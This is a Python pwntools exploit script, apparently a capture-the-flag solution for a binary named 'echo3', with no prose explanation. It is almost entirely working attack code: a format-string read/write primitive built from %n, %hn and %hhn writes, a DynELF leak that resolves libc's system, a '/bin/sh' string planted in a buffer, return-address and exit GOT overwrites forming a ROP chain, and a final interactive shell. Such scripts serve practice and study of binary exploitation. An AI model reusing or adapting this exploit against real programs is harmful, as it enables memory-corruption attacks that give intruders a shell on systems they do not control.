from pwn import *

io = process('./echo3')

"""
0000| 0xffffc480 --> 0x804a080 ("QWER\n")
0004| 0xffffc484 --> 0x804a080 ("QWER\n")
0008| 0xffffc488 --> 0x1000
0012| 0xffffc48c --> 0x0
0016| 0xffffc490 --> 0x32a6ac54 // 4
0020| 0xffffc494 --> 0x0
0024| 0xffffc498 --> 0x0
0028| 0xffffc49c --> 0x0
0032| 0xffffc4a0 --> 0x0
0036| 0xffffc4a4 --> 0x0
0040| 0xffffc4a8 --> 0x0
0044| 0xffffc4ac --> 0x80485d2 (<hardfmt+12>:   add    ebx,0x1a2e)
0048| 0xffffc4b0 --> 0x0
0052| 0xffffc4b4 --> 0x2 // 13: counter
0056| 0xffffc4b8 --> 0xffffc490 --> 0x32a6ac54 // 14
0060| 0xffffc4bc --> 0x5e267900 ('')
0064| 0xffffc4c0 --> 0x0
0068| 0xffffc4c4 --> 0x804a000 --> 0x8049f10 --> 0x1
0072| 0xffffc4c8 --> 0xffffd518 --> 0x0 // 18
0076| 0xffffc4cc --> 0x804877b (<main+236>:     mov    eax,0x0)

0000| 0xffffd518 --> 0x0
0004| 0xffffd51c --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
0008| 0xffffd520 --> 0xf7fc2000 --> 0x1d4d6c
0012| 0xffffd524 --> 0xf7fc2000 --> 0x1d4d6c
0016| 0xffffd528 --> 0x0
0020| 0xffffd52c --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
0024| 0xffffd530 --> 0x1
0028| 0xffffd534 --> 0xffffd5c4 --> 0xffffd703 ("/home/inndy/echo3")
0032| 0xffffd538 --> 0xffffd5cc --> 0xffffd715 ("LS_COLORS="...)
"""

def rawfmt(p, d='ZZXXYYGG'):
    io.sendline(p + d + '\0')
    return io.recvuntil(d)[:-len(d)]

def c(n): return '%{n}c'.format(n=n)
def x(n): return '%{n}$x'.format(n=n)
def s(n): return '%{n}$s'.format(n=n)
def n(n): return '%{n}$n'.format(n=n)
def hn(n): return '%{n}$hn'.format(n=n)
def hhn(n): return '%{n}$hhn'.format(n=n)

def fmt(*args):
    D = '!@#$AABB'
    payload = D.join(args)
    payload = payload.replace('n' + D, 'n') # write
    payload = payload.replace('c' + D, 'c') # one-char
    ret = rawfmt(payload).split(D)
    rargs = [ i for i in args if i[-1] not in 'nc' ] # exclude write or one-char
    def tryparse(v):
        try:
            return int(v, 16)
        except:
            return None

    return [ v if s[-1] == 's' else tryparse(v) for s, v in zip(rargs, ret) ]

local_o = 4
ebp, local = fmt(x(18), x(14))
log.info('ebp = 0x%x' % ebp)
log.info('local = 0x%x' % local)

def to_offset(addr):
    return (addr - local) // 4 + local_o

def to_address(off):
    return (off - local_o) * 4 + local

def s2i(s):
    return u32(s[:4])

p1_o = to_offset(ebp) + 7
p2_o = p1_o + 1

_, p1xx, p2xx, p1x, p2x = fmt(c(0x30), hhn(p1_o), c(2), hhn(p2_o), 'A', s(p1_o), s(p2_o), x(p1_o), x(p2_o))
p1xx, p2xx = s2i(p1xx), s2i(p2xx)

assert p1xx + 2 == p2xx
p1 = to_address(p1_o)
p2 = to_address(p2_o)
log.info('p1: 0x%x' % p1)
log.info('p2: 0x%x' % p2)
log.info('p1x: 0x%x' % p1x)
log.info('p2x: 0x%x' % p2x)
log.info('p1xx: 0x%x' % p1xx)
log.info('p2xx: 0x%x' % p2xx)

p1x_o = to_offset(p1x)
p2x_o = to_offset(p2x)
p1xx_o = to_offset(p1xx)


def set_addr(addr):
    x, y = addr & 0xffff, addr >> 16
    to_add = (y - x) & 0xffff
    payload = c(x) + hn(p1x_o) + (c(to_add) if to_add else '') + hn(p2x_o)
    rawfmt(payload)

def writeval(addr, val, size):
    log.info('write 0x%x to 0x%x with %d bytes' % (val, addr, size))
    set_addr(addr)
    writer = { 1: hhn, 2: hn, 4: n }
    rawfmt((c(val) if val else '') + writer[size](p1xx_o))

def writeint(addr, val):
    writeval(addr, val & 0xffff, 2)
    writeval(addr + 2, (val >> 16) & 0xffff, 2)

def readstr(addr):
    log.info('read from 0x%x' % addr)
    set_addr(addr)
    return rawfmt(s(p1xx_o)) + '\0'

# infinity printf
p_counter = local + 9 * 4
writeval(p_counter+3, 0x80, 1)

elf = ELF('echo3')
d = DynELF(readstr, pointer=0x08048000, elf=elf, libcdb=False)
system = d.lookup('system', 'libc')

bin_sh = elf.symbols['buff'] + 512
rawfmt('A' * 512 + '/bin/sh\0', '/bin/sh')

# rop chain
writeint(to_address(19), system)
writeint(to_address(21), bin_sh)

# don't exit
writeint(elf.got['exit'], 0x8048535) # leave_ret

gdb.attach(io)

# leave loop
writeval(p_counter, 10, 4)

io.interactive()

